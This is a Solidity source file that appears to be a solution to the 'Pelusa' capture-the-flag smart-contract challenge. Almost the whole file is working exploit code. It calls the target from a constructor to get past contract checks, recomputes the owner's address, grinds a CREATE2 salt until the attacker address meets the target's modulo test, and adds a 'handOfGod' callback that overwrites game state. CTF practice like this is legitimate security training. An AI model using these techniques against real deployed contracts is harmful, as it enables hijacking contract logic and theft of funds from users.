// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IPelusa {
    function passTheBall() external;

    function shoot() external;
}

contract PelusaAttacker {
    address public immutable pelusaOwner;
    address public player;
    uint256 public goals;

    constructor(address _pelusaAddress, address _deployer) {
        IPelusa(_pelusaAddress).passTheBall();
        pelusaOwner = address(
            uint160(uint256(keccak256(abi.encodePacked(_deployer, uint256(0)))))
        );
    }

    function attack(address _pelusaAddress) public {
        IPelusa(_pelusaAddress).shoot();
    }

    function getBallPossesion() external view returns (address) {
        return pelusaOwner;
    }

    function handOfGod() external returns (uint256) {
        goals = 2;
        return 22_06_1986;
    }
}

contract DeployPelusaAttacker {
    PelusaAttacker public pelusaAttacker;

    constructor(address _pelusaAddress, address _deployer) {
        bytes32 salt = findSalt(_pelusaAddress, _deployer);
        pelusaAttacker = new PelusaAttacker{salt: salt}(
            _pelusaAddress,
            _deployer
        );
    }

    function findSalt(
        address _pelusaAddress,
        address _deployer
    ) public view returns (bytes32) {
        uint256 salt = 0;
        while (true) {
            address predictedAddress = address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xff),
                                address(this),
                                salt,
                                keccak256(
                                    abi.encodePacked(
                                        type(PelusaAttacker).creationCode,
                                        abi.encode(_pelusaAddress, _deployer)
                                    )
                                )
                            )
                        )
                    )
                )
            );
            if (uint256(uint160(predictedAddress)) % 100 == 10) {
                break;
            }
            salt++;
        }
        return bytes32(salt);
    }
}
